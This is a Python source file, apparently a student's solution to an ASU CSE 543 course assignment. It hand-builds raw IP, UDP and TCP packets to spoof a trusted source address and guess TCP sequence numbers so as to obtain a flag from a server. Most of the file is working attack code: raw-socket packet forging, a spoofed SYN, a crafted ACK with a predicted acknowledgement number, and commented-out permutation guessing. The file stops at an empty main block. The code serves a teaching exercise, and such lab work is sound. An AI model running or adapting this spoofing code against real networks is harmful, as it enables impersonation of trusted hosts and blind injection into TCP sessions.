"""
TCP and UDP Spoofing for ASU CSE 543
"""
import os
import select
import argparse
import array
import time
import threading
import socket
import struct
import binascii
import sys
import errno
import math
#import fcntl
from random import seed
from random import randint
import psutil

# Constants and Globals
#
#
FLAG_SERVER_IP = ''             # To be filled up later
FLAG_SERVER_PORT = 13337        # provided by the assignment
CLIENT_RECEIVING_PORT = 13337   # provided by the assignment
SOURCE_PORT = socket.htons(randint(20000, 50000))       # any random source port
SPOOFED_SRC = '10.2.4.10'       # provided by the assignment
HACKED_ACK = 500000

MESSAGE = ""                    # Message to be sent via UDP or TCP
PROTOCOL = socket.IPPROTO_UDP   # Default socket protocol - can also be TCP

# constants for IP headers
IP_VERSION = 4                  # Version 4 for IPv4. IPv6 to be done...
IP_HDR_LEN = 20                 # Minimum size of an IP header. It can vary from 20 to 60, we keep it simple here
IP_IHL = 5                      # Header length in 32 bit words. 5 words == 20 bytes, in our simple case
DSCP_ENC = 0                    # Type of service (used for QoS). Keep it simple, here is just zero
FLAGS_FRAGMENT = 0              # Flags and fragment - two bytes. Set to zero, again for simplicity
TIME_TO_LIVE = 255              # Deciding the TTL - this is the maximum
SEQUENCE_START = 1

# constants for TCP header
RST_FLAG = 0
TCP_HDR_LEN = 20                # Minimum size of a TCP header - can be bigger, but we keep it simple here

# constants for UDP header
UDP_HDR_LEN = 8                 # Fixed size of an UDP header

# uses congestion control mechanism send TCP requests
current_index, slow_start_flag = 0, 1

GLOBAL_EXIT = False

# Future expansions...
#VALID_HTTP_code = '200 OK'
#SRC_MAC = ""
#DEST_MAC = ""

# Functions
#
#
def udp_thread_handler(ip_addr, port, rx_socket1, rx_socket2):
    """
    Forking thread that listens on the UDP port and prints the receiving
    packets.
    Because of Linux UDP stack quirks, we need to use two UDP sockets for
    RAW capture.
    """
    global GLOBAL_EXIT

    while not GLOBAL_EXIT:
        try:
            r, w, e = select.select([rx_socket1, rx_socket2], [], [])
            for i in r:
                print ("Received on %s port %d data: %s\n" %
                    (ip_addr, port, str(i.recvfrom(131072)[0])))

        except socket.error:
            # If no data is received, you get here, but it's not an error
            # Ignore and continue
            pass

#        time.sleep(.1)

def create_sender_sock():
    """
    Creating sender raw socket
    """
    try:
        sock_tx = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
        print ("Socket created")
    except IOError as error:
        if error.errno != errno.EINTR:
            print ("Sending Socket creation failed (did you run it as root?). Error Code : " +
                str(error.errno))
        sys.exit()
    return sock_tx

def create_receiver_sock():
    """
    Creating receiving raw socket
    """
    try:
        sock_rx = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except IOError as error:
        if error.errno != errno.EINTR:
            print ("Receiving Socket creation failed (did you run it as root?). Error Code : " +
                str(error.errno))
        sys.exit()
    return sock_rx

def get_ip_address_iface(family, ifacename):
    """
    Identifies the IP address set up on a specific interface (tested on Ubuntu).
    Used to retrieve the the OpenVPN interface's (tap0 on Ubuntu)
    IP address.  For debug purposes, it can be called with another interface while
    developing with the VPN interface down.
    """
    interface_list = dict()
    for interface, snics in psutil.net_if_addrs().items():
        for snic in snics:
            if snic.family == family:
                interface_list[interface] = snic.address
    try:
        return interface_list[ifacename]
    except KeyError:
        print ("Interface %s not found! Exiting." % ifacename)
        sys.exit()

def calc_checksum(databytes):
    """
    Calculates checksum for IP and TCP headers
    Calculates IPv4 header's checksum.
    The checksum calculation is defined in RFC 791:

    "The checksum field is the 16-bit ones' complement of the ones' complement sum of all
    16-bit words in the header. For purposes of computing the checksum, the value of the
    checksum field is zero."

    This means we create a header with zero in the checksum and then rebuild it again with
    the checksum.
    """
    chksum = 0
    # for index in range(0,len(databytes-1),2):
    #     word = ord(databytes[index] << 8) + ord(databytes[index+1])
    #     chksum += word
    # chksum = (chksum >> 16) + (chksum & 0xffff)
    # chksum = ~chksum & 0xffff
    #return chksum
    if len(databytes) % 2 != 0:
        databytes += b'\0'
    res = sum(array.array("H", databytes))
    res = (res >> 16) + (res & 0xffff)
    res += res >> 16
    return (~res) & 0xffff

def make_ipv4_header(src_ip, dst_ip, datal, ptcl = socket.IPPROTO_UDP):
    """
    Craft a raw IP header.
    From https://www.ietf.org/rfc/rfc791.txt

    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |Version|  IHL  |Type of Service|          Total Length         |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |         Identification        |Flags|      Fragment Offset    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |  Time to Live |    Protocol   |         Header Checksum       |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                       Source Address                          |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Destination Address                        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Options                    |    Padding    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

                    Example Internet Datagram Header

    By default creates a UDP header. Specify socket.IPPROTO_TCP
    to create a TCP header.

    It only supports UDP and TCP, at the moment.
    """
    srcip = socket.inet_aton(src_ip)    # converts source IP into 4 bytes
    dstip = socket.inet_aton(dst_ip)    # converts destination IP into 4 bytes

    # UDP and TCP fields
    ihlver = (IP_VERSION<<4)+IP_IHL     # compute the value to be put in the first two bytes (IHL and version)
    if ptcl == socket.IPPROTO_UDP:      # ptcl = protocol, 17 = UDP, 6 = TCP
        tlen = datal + IP_HDR_LEN + UDP_HDR_LEN # Length of data (payload) + 20 bytes ipv4 header + 8 bytes (our) udp header
    elif ptcl == socket.IPPROTO_TCP:
        tlen = datal + IP_HDR_LEN + TCP_HDR_LEN # Length of data (payload) + 20 bytes ipv4 header + 20 bytes (our) tcp header
    else:
        print ("Only TCP and UDP supported!")
        sys.exit()

    # Generates a "random" value for IP packets identification number
    #   as it needs to be unique in the communication.
    # I am aware it is broken - but it is easy
    ident = socket.htons(randint(10000, 50000))

    # First assembly of IP header
    chksm = 0
    tmp_ip_header = struct.pack(
        "!"     # Means network (Big Endian)
        "2B"    # Version and IHL, DSCP and ECN
        "3H"    # Total Length, Identification, Flags and Fragment Offset
        "2B"    # Time to live, Protocol
        "H"     # Checksum
        "4s"    # Source IP
        "4s"    # Destination IP
        , ihlver, DSCP_ENC, tlen, ident, FLAGS_FRAGMENT, TIME_TO_LIVE, ptcl, chksm, srcip, dstip)

    chksm = calc_checksum(tmp_ip_header)     # Calculating IP checksum

    # Final assembly of IP header, with checksum
    return struct.pack(
        "!"     # Means network (Big Endian)
        "2B"    # Version and IHL, DSCP and ECN
        "3H"    # Total Length, Identification, Flags and Fragment Offset
        "2B"    # Time to live, Protocol
        "H"     # Checksum
        "4s"    # Source IP
        "4s"    # Destination IP
        , ihlver, DSCP_ENC, tlen, ident, FLAGS_FRAGMENT, TIME_TO_LIVE, ptcl, chksm, srcip, dstip)

def make_udp_header(srcprt, dstprt, datal):
    """
    Craft a raw UDP header.

    UDP headers are trivial.
    From https://www.ietf.org/rfc/rfc768.txt

    Format
    ------
    0      7 8     15 16    23 24    31
    +--------+--------+--------+--------+
    |     Source      |   Destination   |
    |      Port       |      Port       |
    +--------+--------+--------+--------+
    |                 |                 |
    |     Length      |    Checksum     |
    +--------+--------+--------+--------+
    |
    |          data octets ...
    +---------------- ...

        User Datagram Header Format
    """
    # UDP checksum is optional when used over IPv4 (as per RFC 768). For simplicity, here is zero
    chksum = 0

    return struct.pack(
        "!4H"   # Source port, Destination port, Length, Checksum.
        , srcprt, dstprt, datal+8, chksum)

def make_udp_packet(src, dst, udpdata):
    """
    Assembles the UDP packet.
    Just jams together IP header, UDP header and UDP data.

    src = (source ip, source port)
    dst = (destination ip, destination port)

    Returns byte stream of the complete UDP packet.
    """
    ip_header = make_ipv4_header(src[0], dst[0], len(udpdata))
    udp_header = make_udp_header(src[1], dst[1], len(udpdata))
    udp_raw_packet = ip_header + udp_header + bytes(udpdata,'UTF-8')
    return udp_raw_packet

def send_udp_packet (sock_tx, dst, raw_udp_packet):
    """
    Sends the UDP packet over the wire.

    sock_snd = socket to use for sending
    raw_packet = packet to be sent in bytes
    dst = (destination ip, destination port)

    Returns byte stream of the complete UDP packet.
    """
    try:
        sent = sock_tx.sendto(raw_udp_packet, dst)
        if not sent:
            raise RuntimeError("Socket connection broken! Packet not sent.")

    except IOError as error:
        if error.errno != errno.EINTR:
            print ("Socket creation failed (did you run it as root?). Error Code : " +
                str(error.errno))
            sys.exit()
    return sent

def make_tcp_packet(
    src, dst,           # source and destination IP addresses and ports
    seqn,               # Sequence number
    ackn,               # Acknowledgement number
    fin = 0,            # FIN flag
    syn = 1,            # SYN flag
    rst = 0,            # RST flag
    psh = 0,            # PSH flag
    ack = 0,            # ACK flag
    urg = 0,            # URG flag - not pointer!
    urg_ptr = 0,        # Urgent pointer
    tcpdata = ''        # the actual message to be sent
    ):
    """
    Craft a raw TCP packet.  Return a pack of raw bytes.

    The header will actually need to be reprocessed after the IP header is added, to
    calculate the checksum of the whole raw packet (which goes into the TCP portion)

    TCP headers are way more complex than UDP ones, as we have to account
    for the whole handshake, sequence numbers, variable length, etc.

    IP source and destination are required for checksum calculation, but are not part
    of the TCP header (they are in the IP).

    From https://www.ietf.org/rfc/rfc793.txt

    TCP Header Format

     0                   1                   2                   3
     0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |          Source Port          |       Destination Port        |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |                        Sequence Number                        |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |                    Acknowledgment Number                      |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |  Data |           |U|A|P|R|S|F|                               |
    | Offset| Reserved  |R|C|S|S|Y|I|            Window             |
    |       |           |G|K|H|T|N|N|                               |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |           Checksum            |         Urgent Pointer        |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |                    Options                    |    Padding    |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |                             data                              |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    """
    # tcp header fields
    doff = 5                            # 4 bit size of tcp header, 5 * 4 = 20 bytes
    offset_res = (doff << 4) + 0        # offset + reserved (KISS principle)
    tcp_window = socket.htons (1500)
    tcp_checksum = 0                    # checksum to be recalculated later

    # Calculates 6 bits' TCP flags
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)

    data_len = len(tcpdata)             # payload length
    if data_len % 2 == 1:               # round up even values for payload length
        data_len += 1
    src_ip = src[0]
    src_port = src[1]
    dst_ip = dst[0]
    dst_port = dst[1]

    # Constructing pseudo header for checksum calculation
    # As per algorithm in RFC 793
    tcp_pseudo_header = struct.pack('!HHLLBBHHH', src_port, dst_port, seqn, ackn,
        offset_res, tcp_flags, tcp_window, tcp_checksum, urg_ptr)
    tcp_pseudo_header += str.encode(tcpdata, 'utf-8')

    rsrv_bits = 0
    #tcp_length = len(str(tcp_pseudo_header))

    srcip = socket.inet_aton(src_ip)    # converts source IP into 4 bytes
    dstip = socket.inet_aton(dst_ip)    # converts destination IP into 4 bytes

    tcp_pseudo_header_len = len(str(tcp_pseudo_header))
    pseudo_hdr = struct.pack('!4s4sBBH',
        srcip,
        dstip,
        rsrv_bits,
        socket.IPPROTO_TCP,
        TCP_HDR_LEN + tcp_pseudo_header_len)
    pseudo_hdr += tcp_pseudo_header
    tcp_checksum = calc_checksum(pseudo_hdr)

    #if not tcpdata:
    tcp_packet = struct.pack(
        "!"     # Means network (Big Endian)
        "H"     # TCP Source Port
        "H"     # TCP Destination Port
        "L"     # Sequence Number
        "L"     # Acknowledgment Number
        "B"     # Offset + Reserved
        "B"     # TCP Flags
        "H"     # TCP Window
        "H"     # Checksum
        "H",    # Urgent pointer
        src_port, dst_port, seqn, ackn, offset_res, tcp_flags, tcp_window,
            tcp_checksum, urg_ptr)

    ip_header = make_ipv4_header(src[0], dst[0], len(tcp_packet), socket.IPPROTO_TCP)
    raw_packet = ip_header + tcp_packet + str.encode(tcpdata, 'utf-8')

    return raw_packet

def send_tcp_packet (sock_tx, dst, raw_tcp_packet):
    """
    Sends the TCP packet over the wire.

    sock_snd = socket to use for sending
    raw_packet = packet to be sent in bytes
    dst = (destination ip, destination port)

    Returns byte stream of the complete TCP packet.
    """
    try:
        sent = sock_tx.sendto(raw_tcp_packet, dst)
        if not sent:
            raise RuntimeError("Socket connection broken! Packet not sent.")

    except IOError as error:
        if error.errno != errno.EINTR:
            print ("Socket creation failed (did you run it as root?). Error Code : " +
                str(error.errno))
            sys.exit()
    return sent

def get_received_packet(
    sock_rx,            # receiving socket to use
    src, dst,           # source/destination IP addresses and ports
    ):
    """
    Receives a TCP packet, looping until it gets a packet destined for the specified port and IP.

    Returns a pack of raw bytes.
    """
    src_ip = ""
    dest_port = ""

    while (src_ip != str(dst[0]) and dest_port != str(src[1]) or src_ip != "" and dest_port != ""):
        recv_packet = sock_rx.recv(65565)
        ip_header = recv_packet[0:20]
        ip_hdr = struct.unpack("!2sH8s4s4s",ip_header)     # unpacking to get IP header
        src_ip = socket.inet_ntoa(ip_hdr[3])
        tcp_header = recv_packet[20:40]                    # unpacking to get TCP header
        tcp_hdr = struct.unpack('!HHLLBBHHH',tcp_header)
        dest_port = str(tcp_hdr[1])
        #dest_ip = ""
        dest_port = ""
    return recv_packet, tcp_hdr

def check_ack_received(
    seq_no,
    ack_no,
    rx_sock,
    src,
    dst,
    tcp_hdr_max = 40
    ):
    """
    Retrieves server's responses.
    """
    recv_packet, tcp_hdr = get_received_packet(rx_sock, src, dst)
    mss_ = 0
    seq_no_recv = tcp_hdr[2]
    ack_no_recv = tcp_hdr[3]
    tcp_flags = tcp_hdr[5]
    if len (tcp_hdr) > 9:
        mss_ = tcp_hdr[9]                 # get MSS from SYN-ACK segment
    #ack_flag = (tcp_flags & 18)
    # It's either the initial TCP handshake, or a normal data exchange.
    # Only in the initial exchange (SYN+ACK=flags=18), ACK = SEQ +1
    # Otherwise, normal data exchange SEQ = previous ACK
    if ((tcp_flags & 18) == 18 and (seq_no == ack_no_recv - 1)) or (seq_no_recv == ack_no):
        return seq_no_recv, ack_no_recv, mss_, len(recv_packet)
    else:
        if (tcp_flags & 1):
            print ("Connection closed by the server! (FIN packet)")
            return False, False, mss_, 0

def send_receive_tcp_message(
    sock_tx,                        # sending socket
    sock_rx,                        # receiving socket
    src, dst,                       # source and destination IP and ports
    sequence_num,                   # sequence number to use
    ack_num,                        # acknowledge number to use
    tcp_data = ""):                 # message to send
    """
    Used to send the TCP payload and wait for a response from the server.

    Returns the sequence number, acknowledge and MSS from the response.
    """
    # Assembles the TCP packet
    raw_packet = make_tcp_packet(
        src,
        dst,
        sequence_num,                       # Sequence number to start with
        ack_num,                            # Acknowledgement number
        0,                                  # FIN flag
        0,                                  # SYN flag
        0,                                  # RST flag
        0,                                  # PSH flag - set to 0 for pushing messages
        1,                                  # ACK flag - set to 1 for pushing messages
        0,                                  # URG flag
        0,                                  # urgent pointer
        tcp_data)                           # TCP payload

    send_tcp_packet (sock_tx, dst, raw_packet)
    if not args.guess:
        print ("Sent Sequence #: %d, Acknowledgement # %d, Message: %s" % (sequence_num, ack_num, str(tcp_data)))
    rcv_seq, rcv_ack, mss_, length = check_ack_received (sequence_num, ack_num, sock_rx, src, dst, 40)

    return rcv_seq, rcv_ack, mss_, length

def be_to_le(value: int) -> int:
    """
    Big Endian to Littel Endian
    """
    numbytes = math.ceil(value.bit_length() / 8)
    return int.from_bytes(value.to_bytes(numbytes, byteorder="little"), byteorder="big")

def perform_tcp_handshake(
    sock_tx,                        # sending socket
    sock_rx,                        # receiving socket
    src, dst,                       # source and destination IP and ports
    sequence_start = 1,             # sequence number to start with (generally 1)
    tcp_data = ""                   # will put them in ACK as payload if used
    ):
    """
    Implements TCP handshake sequence.
    Must return packet length as it is used
    """
    # Assembles the SYN packet
    raw_packet = make_tcp_packet(
        src,
        dst,
        sequence_start,                     # Sequence number to start with
        0,                                  # Starting acknowledgement number
        0,                                  # FIN flag
        1,                                  # SYN flag - set to 1 at the beginning of handshake
        0,                                  # RST flag
        0,                                  # PSH flag
        0,                                  # ACK flag
        0,                                  # URG flag
        0,                                  # urgent pointer
        "")                                 # TCP message
    send_tcp_packet (sock_tx, dst, raw_packet)
    if not args.guess:
        print ("Sent Sequence %d, Acknowledgement %d" % (sequence_start, 0))

    # Received the SYN/ACK package
    rcv_seq, rcv_ack, mss_, length = check_ack_received (sequence_start, 0, sock_rx, src, dst, 40)

    print ("Received Acknowledgement:%d/%s - Sequence %d/BE:%s/LE:%s, Packet length:%d" %
        (rcv_ack, hex(rcv_ack),
        rcv_seq, hex(rcv_seq), hex(be_to_le(rcv_seq)),
        length))

    if rcv_ack != (sequence_start + 1):		    # in case we don't receive our syn-ack or it's wrong
        print ("Handshake error!")
        sys.exit()
    else:
        # Reply with ACK packet and completes TCP/IP handshake.
        # Actually not necessary for this assignment, but still educational.
        if not args.guess:
            print ("SYN/ACK correct!")
        raw_packet = make_tcp_packet(
            src,
            dst,
            sequence_start + 1,                 # Sequence number is sequence_start + 1 (or rcv_ack)
            rcv_seq+1,                          # New acknowledgement number is sequence received + 1
            0,                                  # FIN flag
            0,                                  # SYN flag - set to 0 now
            0,                                  # RST flag
            0,                                  # PSH flag
            1,                                  # ACK flag
            0,                                  # URG flag
            0,                                  # urgent pointer
            tcp_data)                           # TCP message - if used
        send_tcp_packet (sock_tx, dst, raw_packet)
        if not args.guess:
            print ("Sent final ACK Sequence %d - %s, Acknowledgement %d - %s"
                % (sequence_start+1, hex(sequence_start+1), rcv_seq+1, hex(rcv_seq+1)))
            print ("Three-way handshake complete!")

        # In a real four way handshake, I should receive an ACK
#        rcv_seq, rcv_ack, mss, length = check_ack_received (rcv_seq+1, rcv_ack, sock_rx, src, dst, 40)
#        print ("Received Sequence #: %d, Acknowledgement # %d, Packet length %d" % (rcv_seq, rcv_ack, length))

        # In a real four way handshake, I should receive a ACK+PSH
        # ACK should be the previous SEQ
#        rcv_seq, rcv_ack, mss, length = check_ack_received (rcv_seq+1, rcv_ack, sock_rx, src, dst, 40)
#        print ("Received Sequence #: %d, Acknowledgement # %d, Packet length %d" % (rcv_seq, rcv_ack, length))

    return sequence_start+1, rcv_seq

def perform_tcp_hackingshake(
    sock_tx,                        # sending socket
    sock_rx,                        # receiving socket
    src,                            # source IP and ports
    spoofed_ip,                     # source is spoofed!
    dst,                            # destination IP and ports
    seq,                            # sequence number from previous handshake
    last_ack,                       # acknowledgement from the last handshake, if existing
    tcp_data = ""                   # message to send
    ):
    """
    Implements TCP hacking with spoofing.

    Tries to guess the right sequence number
    which should return the string on the UDP socket.

    """
    int_to_four_bytes = struct.Struct('<I').pack

    # Received the SYN/ACK package
    if src[0] == spoofed_ip:        # No spoofing, so we can just listen for the response
        rcv_seq, rcv_ack, mss_, length = check_ack_received (seq, 0, sock_rx, src, dst, 40)
    else:
        # Here we are spoofing.
        # Before that, performs TCP/IP handshakes to get the SEQs.

        # Breaks down the SEQ number into four hex bytes
        d_, c_, b_, a_ = int_to_four_bytes (last_ack & 0xFFFFFFFF)       # Inverts due to endianess
        #a_, b_, c_, d_ = int_to_four_bytes (seq & 0xFFFFFFFF)
        print ("Hex sequence from the ACK: %s %s %s %s " % (hex(a_), hex(b_), hex(c_), hex(d_)))

        # Performs more handshakings to learn the current sequence
        new_ack, new_seq = perform_tcp_handshake(
            sock_tx, sock_rx,
            src,                        # IP source, IP source port
            dst,                        # IP destination, IP destination port
            SEQUENCE_START)		        # sequence number for handshake
        d_, c_, b_, a_ = int_to_four_bytes (new_seq & 0xFFFFFFFF)       # Inverts due to endianess
        #a_, b_, c_, d_ = int_to_four_bytes (new_seq & 0xFFFFFFFF)
        print ("Hex sequence from the ACK: %s %s %s %s " % (hex(a_), hex(b_), hex(c_), hex(d_)))

        # Performs more handshakings to learn the current sequence
        new_ack, new_seq = perform_tcp_handshake(
            sock_tx, sock_rx,
            src,                        # IP source, IP source port
            dst,                        # IP destination, IP destination port
            SEQUENCE_START)		        # sequence number for handshake
        d_, c_, b_, a_ = int_to_four_bytes (new_seq & 0xFFFFFFFF)       # Inverts due to endianess
        #a_, b_, c_, d_ = int_to_four_bytes (new_seq & 0xFFFFFFFF)
        print ("Hex sequence from the ACK: %s %s %s %s " % (hex(a_), hex(b_), hex(c_), hex(d_)))

        # Performs more handshakings to learn the current sequence
        new_ack, new_seq = perform_tcp_handshake(
            sock_tx, sock_rx,
            src,                        # IP source, IP source port
            dst,                        # IP destination, IP destination port
            SEQUENCE_START)		        # sequence number for handshake
        d_, c_, b_, a_ = int_to_four_bytes (new_seq & 0xFFFFFFFF)       # Inverts due to endianess
        #a_, b_, c_, d_ = int_to_four_bytes (new_seq & 0xFFFFFFFF)
        print ("Hex sequence from the ACK: %s %s %s %s " % (hex(a_), hex(b_), hex(c_), hex(d_)))

        # Now tries to spoof
        raw_syn_packet = make_tcp_packet(
            (spoofed_ip, src[1]),               # construct spoofed packet
            dst,                                # flag server
            SEQUENCE_START,                     # Sequence number
            0,                                  # Acknowledgement number
            0,                                  # FIN flag
            1,                                  # SYN flag - SYN packet
            0,                                  # RST flag
            0,                                  # PSH flag
            0,                                  # ACK flag
            0,                                  # URG flag
            0,                                  # urgent pointer
            "")                                 # TCP message

        send_tcp_packet (sock_tx, dst, raw_syn_packet)
        print ("Spoofed SYN packet sent - Source %s:%s, Sequence # %d, Acknowledgement # %d" %
            (spoofed_ip, src[1], SEQUENCE_START, 0))
        time.sleep(.5)      # Give time to answer with SYN/ACK to the spoofed system

        raw_ack_packet = craft_hack_packet (d_, a_, b_, c_, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0])

        send_tcp_packet (sock_tx, dst, raw_ack_packet[0])
        print ("Spoofed ACK packet sent - Source %s:%s, Sequence # %d, Acknowledgement # %d" %
            (spoofed_ip, src[1], SEQUENCE_START+1, SEQUENCE_START+1, 1))

        # Tries to guess the SEQ number using various combinations
        # raw_ack_packet = []
        # raw_ack_packet.append(craft_hack_packet (a_, c_, b_, d_,   spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (d_, a_, b_, c_,   spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (b_, c_, d_+1, a_, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (a_, b_+1, c_, d_, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (d_, a_, b_+1, c_, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (d_, a_, b_+2, c_, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (c_, d_, a_, b_+2, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (c_, d_, a_, b_+3, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (b_+3, c_, d_, a_, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (b_, a_, c_, d_,   spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (b_+1, a_, c_, d_, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (b_+2, d_, a_, c_, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (a_, d_, c_, b_+3, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (d_, c_, b_+4, a_, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (d_, c_, b_+5, a_, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (d_, b_+6, c_, a_, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (d_, c_, b_+4, a_, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (d_, c_, b_+5, a_, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (d_, b_+6, c_, a_, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (c_, d_, b_+21, a_, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (c_, b_+21, d_, a_, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (b_+22, a_, d_, c_, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))

        # raw_ack_packet.append(craft_hack_packet (d_, c_, b_+5, a_, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (d_, b_+6, c_, a_, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (c_, d_, b_+21, a_, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (c_, b_+21, d_, a_, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))
        # raw_ack_packet.append(craft_hack_packet (b_+22, a_, d_, c_, spoofed_ip, src[1], dst, SEQUENCE_START+1, src [0]))

        # # Sends the packets repetitevely until UDP receives something
        # count = 0
        # while (count < 2):
        #     send_tcp_packet (sock_tx, dst, raw_syn_packet)
        #     print ("Spoofed SYN packet sent - Source %s:%s, Sequence # %d, Acknowledgement # %d" %
        #         (spoofed_ip, src[1], SEQUENCE_START, 0))
        #     time.sleep(.5)      # Give time to answer with SYN/ACK to the spoofed system
        #     for x in raw_ack_packet:
        #         send_tcp_packet (sock_tx, dst, x[0])
        #         print ("Spoofed ACK packet sent - Source %s:%s, Sequence # %d, Acknowledgement # %d" %
        #             (spoofed_ip, src[1], SEQUENCE_START+1, x[1]))

        #     time.sleep(.5)      # Give time to answer
        #     count += 1

    return SEQUENCE_START+1, 0

def craft_hack_packet (a_, b_, c_, d_,
    spoofed_ip,
    src_port,
    dst,
    seq,
    tcpdata):
    """
    Creates spoofed source packet with arbitrary SEQ number
    """
    # Tries to exploit the SEQ number
    hacked_ack = int.from_bytes([a_, b_, c_, d_], byteorder='big', signed=False)
    #print ("Before conversion %s - After conversion %s" % (hex(new_ack), hex(hacked_ack)))
    #    hacked_ack = int.from_bytes(byte_val, "big", signed="True")

    # Send payload with spoofed TCP source - will get the flag if SEQ is guessed
    raw_ack_packet = make_tcp_packet(
        (spoofed_ip, src_port),             # construct spoofed packet
        dst,                                # flag server
        seq,                                # Sequence number
        hacked_ack+1,                       # Hacked acknowledgement number
        0,                                  # FIN flag
        0,                                  # SYN flag
        0,                                  # RST flag
        0,                                  # PSH flag
        1,                                  # ACK flag - ACK packet
        0,                                  # URG flag
        0,                                  # urgent pointer
        tcpdata)                            # TCP message = my real source IP

    return raw_ack_packet, hacked_ack

def open_tcp_sockets ():
    try:
        # Create sender and receiver sockets.
        # Beware of a Linux IP stack quirk, as per man raw(7):
        #
        # A  protocol of IPPROTO_RAW implies enabled IP_HDRINCL and is able to send any
        # IP protocol that is specified in the passed header.  Receiving of all IP protocols
        # via IPPROTO_RAW is not possible using raw sockets.
        #
        # Because of that, receiving socket must be set to IPPROTO_TCP.

        sock_snd = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.SOCK_RAW)
        sock_snd.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        sock_rcv = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock_rcv.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        if not args.guess:
            print ("Sockets created")
    except IOError as error:
        if error.errno != errno.EINTR:
            print ("Socket creation failed (did you run it as root?). Error Code : " +
                str(error.errno))
            sys.exit()
    return sock_snd, sock_rcv

if __name__ == "__main__":
